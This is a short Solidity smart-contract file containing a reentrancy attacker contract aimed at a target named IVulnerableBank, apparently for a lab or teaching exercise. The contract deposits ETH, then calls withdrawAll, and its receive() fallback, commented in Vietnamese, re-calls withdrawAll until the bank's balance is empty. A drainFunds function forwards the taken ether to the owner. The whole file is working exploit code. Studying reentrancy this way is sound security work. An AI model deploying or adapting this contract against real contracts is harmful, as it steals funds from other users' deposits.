// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IVulnerableBank {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Attacker {
    IVulnerableBank public immutable bank;
    address payable public owner;

    constructor(address _bankAddress) {
        bank = IVulnerableBank(_bankAddress);
        owner = payable(msg.sender);
    }

    function setupAttack() external payable {
        require(msg.value > 0, "Must send some ETH to deposit");
        bank.deposit{value: msg.value}();
    }

    function attack() external {
        require(msg.sender == owner, "Only owner can attack");
        bank.withdrawAll();
    }
    
    receive() external payable {
        // Nếu bank vẫn còn tiền, gọi lại withdrawAll() để rút tiếp
        if (address(bank).balance > 0) {
            bank.withdrawAll();
        }
    }

    function drainFunds() external {
        require(msg.sender == owner, "Only owner can drain funds");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Failed to send funds to owner");
    }
}